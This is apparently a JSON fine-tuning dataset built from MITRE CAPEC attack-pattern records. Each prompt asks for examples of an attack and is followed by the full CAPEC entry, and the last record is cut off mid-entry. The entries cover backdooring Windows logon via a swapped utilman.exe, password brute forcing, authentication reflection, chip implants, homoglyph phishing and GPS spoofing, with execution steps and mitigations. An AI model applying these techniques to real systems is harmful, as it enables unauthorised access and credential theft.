[
  {
    "instruction": "Given the attack pattern: Replace Trusted Executable (CAPEC ID: 558), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Specific versions of Windows contain accessibility features that may be launched with a key combination before a user has logged in (for example when they are on the Windows Logon screen). On Windows XP and Windows Server 2003/R2, the program (e.g. \"C:\\Windows\\System32\\utilman.exe\") may be replaced with cmd.exe (or another program that provides backdoor access). Then pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over RDP will cause the replaced file to be executed with SYSTEM privileges.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Specific versions of Windows contain accessibility features that may be launched with a key combination before a user has logged in (for example when they are on the Windows Logon screen). On Windows XP and Windows Server 2003/R2, the program (e.g. \"C:\\Windows\\System32\\utilman.exe\") may be replaced with cmd.exe (or another program that provides backdoor access). Then pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over RDP will cause the replaced file to be executed with SYSTEM privileges.",
      "@Name": "Replace Trusted Executable (CAPEC ID: 558)",
      "attack_ptrn": {
        "@ID": "558",
        "@Name": "Replace Trusted Executable",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version and enable the execution of malware when that trusted executable is called.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "542"
          }
        },
        "Example_Instances": {
          "Example": "Specific versions of Windows contain accessibility features that may be launched with a key combination before a user has logged in (for example when they are on the Windows Logon screen). On Windows XP and Windows Server 2003/R2, the program (e.g. \"C:\\Windows\\System32\\utilman.exe\") may be replaced with cmd.exe (or another program that provides backdoor access). Then pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over RDP will cause the replaced file to be executed with SYSTEM privileges."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "284"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1505.005",
              "Entry_Name": "Server Software Component: Terminal Services DLL"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1546.008",
              "Entry_Name": "Event Triggered Execution: Accessibility Features"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, References, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Password Brute Forcing (CAPEC ID: 49)",
    "context": "",
    "output": "Examples of Password Brute Forcing (CAPEC ID: 49) are: A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143"
      ],
      "@Name": "Password Brute Forcing (CAPEC ID: 49)",
      "attack_ptrn": {
        "@ID": "49",
        "@Name": "Password Brute Forcing",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.",
        "Extended_Description": {
          "xhtml:p": "A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy. In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.). Knowing the password policy on the system can make a brute force attack more efficient. For instance, if the policy states that all passwords must be of a certain level, there is no need to check smaller candidates."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "112"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine application's/system's password policy] Determine the password policies of the target application/system.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks)."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.",
              "Technique": [
                "Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.",
                "Perform an offline dictionary attack or a rainbow table attack against a known password hash."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An adversary needs to know a username to target.",
            "The system uses password based authentication as the one factor authentication mechanism.",
            "An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A brute force attack is very straightforward. A variety of password cracking tools are widely available."
          }
        },
        "Resources_Required": {
          "Resource": "A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge)."
        },
        "Indicators": {
          "Indicator": "Many incorrect login attempts are detected by the system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.",
            "Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.",
            "Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "A system does not enforce a strong password policy and the user picks a five letter password consisting of lower case English letters only. The system does not implement any password throttling mechanism. Assuming the adversary does not know the length of the users' password, an adversary can brute force this password in maximum 1+26+26^2+26^3+26^4+26^5 = 1 + 26 + 676 + 17576 + 456976 + 11,881,376 = 12,356,631 attempts, and half these tries (6,178,316) on average. Using modern hardware this attack is trivial. If the adversary were to assume that the user password could also contain upper case letters (and it was case sensitive) and/or numbers, than the number of trials would have been larger.",
                "An adversary's job would have most likely been even easier because many users who choose easy to brute force passwords like this are also likely to use a word that can be found in the dictionary. Since there are far fewer valid English words containing up to five letters than 12,356,631, an attack that tries each of the entries in the English dictionary would go even faster."
              ]
            },
            "A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "257"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1110.001",
            "Entry_Name": "Brute Force:Password Guessing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Description, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Reflection Attack in Authentication Protocol (CAPEC ID: 90)",
    "context": "",
    "output": "Possible examples: A single sign-on solution for a network uses a fixed pre-shared key with its clients to initiate the sign-on process in order to avoid eavesdropping on the initial exchanges.\n- An attacker can use a reflection attack to mimic a trusted client on the network to participate in the sign-on exchange.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A single sign-on solution for a network uses a fixed pre-shared key with its clients to initiate the sign-on process in order to avoid eavesdropping on the initial exchanges.",
        "An attacker can use a reflection attack to mimic a trusted client on the network to participate in the sign-on exchange."
      ],
      "@Name": "Reflection Attack in Authentication Protocol (CAPEC ID: 90)",
      "attack_ptrn": {
        "@ID": "90",
        "@Name": "Reflection Attack in Authentication Protocol",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the adversary illegitimate access to the target system, without possessing the requisite credentials. Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An adversary can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "272",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "114",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify service with vulnerable handshake authentication] The adversary must first identify a vulnerable authentication protocol. The most common indication of an authentication protocol vulnerable to reflection attack is when the client initiates the handshake, rather than the server. This allows the client to get the server to encrypt targeted data using the server's pre-shared key."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Send challenge to target server] The adversary opens a connection to the target server and sends it a challenge. This challenge is arbitrary and is simply used as a placeholder for the protocol in order to get the server to respond."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Receive server challenge] The server responds by returning the challenge sent encrypted with the server's pre-shared key, as well as its own challenge to the attacker sent in plaintext. We will call this challenge sent by the server \"C\". C is very important and is stored off by the adversary for the next step."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Initiate second handshake] Since the adversary does not possess the pre-shared key, they cannot encrypt C from the previous step in order for the server to authenticate them. To get around this, the adversary initiates a second connection to the server while still keeping the first connection alive. In the second connection, the adversary sends C as the initial client challenge, which rather than being arbitary like the first connection, is very intentional."
            },
            {
              "Step": "5",
              "Phase": "Experiment",
              "Description": "[Receive encrypted challenge] The server treats the intial client challenge in connection two as an arbitrary client challenge and responds by encrypting C with the pre-shared key. The server also sends a new challenge. The adversary ignores the server challenge and stores the encrypted version of C. The second connection is either terminated or left to expire by the adversary as it is no longer needed."
            },
            {
              "Step": "6",
              "Phase": "Exploit",
              "Description": "The adversary now posseses the encrypted version of C that is obtained through connection two. The adversary continues the handshake in connection one by responding to the server with the encrypted version of C, verifying that they have access to the pre-shared key (when they actually do not). Because the server uses the same pre-shared key for all authentication it will decrypt C and authenticate the adversary for the first connection, giving the adversary illegitimate access to the target system."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The attacker must have direct access to the target server in order to successfully mount a reflection attack. An intermediate entity, such as a router or proxy, that handles these exchanges on behalf of the attacker inhibits the attackers' ability to attack the authentication protocol."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to have knowledge of observing the protocol exchange and managing the required connections in order to issue and respond to challenges"
          }
        },
        "Resources_Required": {
          "Resource": "All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Gain Privileges",
                "Bypass Protection Mechanism"
              ]
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "The server must initiate the handshake by issuing the challenge. This ensures that the client has to respond before the exchange can move any further",
            "The use of HMAC to hash the response from the server can also be used to thwart reflection. The server responds by returning its own challenge as well as hashing the client's challenge, its own challenge and the pre-shared secret. Requiring the client to respond with the HMAC of the two challenges ensures that only the possessor of a valid pre-shared secret can successfully hash in the two values.",
            "Introducing a random nonce with each new connection ensures that the attacker cannot employ two connections to attack the authentication protocol"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "A single sign-on solution for a network uses a fixed pre-shared key with its clients to initiate the sign-on process in order to avoid eavesdropping on the initial exchanges.",
              "An attacker can use a reflection attack to mimic a trusted client on the network to participate in the sign-on exchange."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "301"
            },
            {
              "@CWE_ID": "303"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Malicious Code Implanted During Chip Programming (CAPEC ID: 672)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Following a chip\u2019s production process steps of test and verification and validation of chip circuitry, an adversary involved in the generation of microcode defining the chip\u2019s function(s) inserts a malicious instruction that will become part of the chip\u2019s program. When integrated into a system, the chip will produce an effect intended by the adversary.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Following a chip\u2019s production process steps of test and verification and validation of chip circuitry, an adversary involved in the generation of microcode defining the chip\u2019s function(s) inserts a malicious instruction that will become part of the chip\u2019s program. When integrated into a system, the chip will produce an effect intended by the adversary.",
      "@Name": "Malicious Code Implanted During Chip Programming (CAPEC ID: 672)",
      "attack_ptrn": {
        "@ID": "672",
        "@Name": "Malicious Code Implanted During Chip Programming",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "During the programming step of chip manufacture, an adversary with access and necessary technical skills maliciously alters a chip\u2019s intended program logic to produce an effect intended by the adversary when the fully manufactured chip is deployed and in operational use. Intended effects can include the ability of the adversary to remotely control a host system to carry out malicious acts."
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": {
              "@Exclude_ID": "688"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary would need to have access to a foundry\u2019s or chip maker\u2019s development/production environment where programs for specific chips are developed, managed and uploaded into targeted chips prior to distribution or sale."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "An adversary needs to be skilled in microprogramming, manipulation of configuration management systems, and in the operation of tools used for the uploading of programs into chips during manufacture. Uploading can be for individual chips or performed on a large scale basis."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Alter Execution Logic"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Utilize DMEA\u2019s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.",
            "Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management of microcode and microcode generating tools and software.",
            "Require that provenance of COTS microelectronic components be known whenever procured.",
            "Conduct detailed vendor assessment before acquiring COTS hardware."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "Following a chip\u2019s production process steps of test and verification and validation of chip circuitry, an adversary involved in the generation of microcode defining the chip\u2019s function(s) inserts a malicious instruction that will become part of the chip\u2019s program. When integrated into a system, the chip will produce an effect intended by the adversary."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-662"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-09-29",
            "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
          }
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Homograph Attack via Homoglyphs (CAPEC ID: 632)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Homograph Attack via Homoglyphs (CAPEC ID: 632) are: An adversary sends an email, impersonating bankofamerica.com to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.\n- However, the link the in email is bankofamerica.com, where the 'a' and 'e' characters are Cyrillic and not ASCII, instead of bankofamerica.com (all ASCII), which the user clicks after carefully reading the URL, making sure that typosquatting and soundsquatting attacks are not being leveraged against them.\n- The user is directed to the adversary's website, which appears as if it is the legitimate bankofamerica.com login page.\n- The user thinks they are logging into their account, but have actually just given their bankofamerica.com credentials to the adversary. The adversary can now use the user's legitimate bankofamerica.com credentials to log into the user's account and steal any money which may be in the account.\n- Homograph vulnerability allows an adversary to impersonate a trusted domain by leveraging homoglyphs and tricking a user into visiting the malicious website to steal user credentials.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary sends an email, impersonating bankofamerica.com to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.",
        "However, the link the in email is bankofamerica.com, where the 'a' and 'e' characters are Cyrillic and not ASCII, instead of bankofamerica.com (all ASCII), which the user clicks after carefully reading the URL, making sure that typosquatting and soundsquatting attacks are not being leveraged against them.",
        "The user is directed to the adversary's website, which appears as if it is the legitimate bankofamerica.com login page.",
        "The user thinks they are logging into their account, but have actually just given their bankofamerica.com credentials to the adversary. The adversary can now use the user's legitimate bankofamerica.com credentials to log into the user's account and steal any money which may be in the account.",
        "Homograph vulnerability allows an adversary to impersonate a trusted domain by leveraging homoglyphs and tricking a user into visiting the malicious website to steal user credentials."
      ],
      "@Name": "Homograph Attack via Homoglyphs (CAPEC ID: 632)",
      "attack_ptrn": {
        "@ID": "632",
        "@Name": "Homograph Attack via Homoglyphs",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary registers a domain name containing a homoglyph, leading the registered domain to appear the same as a trusted domain. A homograph attack leverages the fact that different characters among various character sets look the same to the user. Homograph attacks must generally be combined with other attacks, such as phishing attacks, in order to direct Internet traffic to the adversary-controlled destinations.",
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "Homoglyph Attack"
          }
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "616",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "437"
                },
                {
                  "@Exclude_ID": "512"
                },
                {
                  "@Exclude_ID": "513"
                },
                {
                  "@Exclude_ID": "515"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "89"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "543"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.",
              "Technique": "Research popular or high traffic websites."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the URL containing the homoglpyh character(s).",
              "Technique": "Register the Homograph domain."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the Homograph domain.",
              "Technique": "Execute a phishing attack and send a user an e-mail convincing the to click on a link leading the user to the malicious domain."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Adversaries must be able to register DNS hostnames/URL\u2019s."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Other",
            "Impact": "Other",
            "Note": "Depending on the intention of the adversary, a successful Homograph attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Authenticate all servers and perform redundant checks when using DNS hostnames.",
            "Utilize browsers that can warn users if URLs contain characters from different character sets."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An adversary sends an email, impersonating bankofamerica.com to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.",
              "However, the link the in email is bankofamerica.com, where the 'a' and 'e' characters are Cyrillic and not ASCII, instead of bankofamerica.com (all ASCII), which the user clicks after carefully reading the URL, making sure that typosquatting and soundsquatting attacks are not being leveraged against them.",
              "The user is directed to the adversary's website, which appears as if it is the legitimate bankofamerica.com login page.",
              "The user thinks they are logging into their account, but have actually just given their bankofamerica.com credentials to the adversary. The adversary can now use the user's legitimate bankofamerica.com credentials to log into the user's account and steal any money which may be in the account.",
              "Homograph vulnerability allows an adversary to impersonate a trusted domain by leveraging homoglyphs and tricking a user into visiting the malicious website to steal user credentials."
            ],
            "#text": "See also: CVE-2012-0584 CVE-2009-0652 CVE-2005-0233 CVE-2005-0234 CVE-2005-0235 CVE-2005-0236 CVE-2005-0237 CVE-2005-0238"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1007"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Carry-Off GPS Attack (CAPEC ID: 628)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Carry-Off GPS Attack (CAPEC ID: 628) are: A \"proof-of-concept\" attack was successfully performed in June, 2013, when the luxury yacht \"White Rose\" was misdirected with spoofed GPS signals from Monaco to the island of Rhodes by a group of aerospace engineering students from the Cockrell School of Engineering at the University of Texas in Austin. The students were aboard the yacht, allowing their spoofing equipment to gradually overpower the signal strengths of the actual GPS constellation satellites, altering the course of the yacht.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A \"proof-of-concept\" attack was successfully performed in June, 2013, when the luxury yacht \"White Rose\" was misdirected with spoofed GPS signals from Monaco to the island of Rhodes by a group of aerospace engineering students from the Cockrell School of Engineering at the University of Texas in Austin. The students were aboard the yacht, allowing their spoofing equipment to gradually overpower the signal strengths of the actual GPS constellation satellites, altering the course of the yacht.",
      "@Name": "Carry-Off GPS Attack (CAPEC ID: 628)",
      "attack_ptrn": {
        "@ID": "628",
        "@Name": "Carry-Off GPS Attack",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "A common form of a GPS spoofing attack, commonly termed a carry-off attack begins with an adversary broadcasting signals synchronized with the genuine signals observed by the target receiver. The power of the counterfeit signals is then gradually increased and drawn away from the genuine signals. Over time, the adversary can carry the target away from their intended destination and toward a location chosen by the adversary.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "627",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "The target must be relying on valid GPS signal to perform critical operations."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "This attack requires advanced knoweldge in GPS technology."
          }
        },
        "Example_Instances": {
          "Example": "A \"proof-of-concept\" attack was successfully performed in June, 2013, when the luxury yacht \"White Rose\" was misdirected with spoofed GPS signals from Monaco to the island of Rhodes by a group of aerospace engineering students from the Cockrell School of Engineering at the University of Texas in Austin. The students were aboard the yacht, allowing their spoofing equipment to gradually overpower the signal strengths of the actual GPS constellation satellites, altering the course of the yacht."
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-489",
            "@Section": "GPS Spooking"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
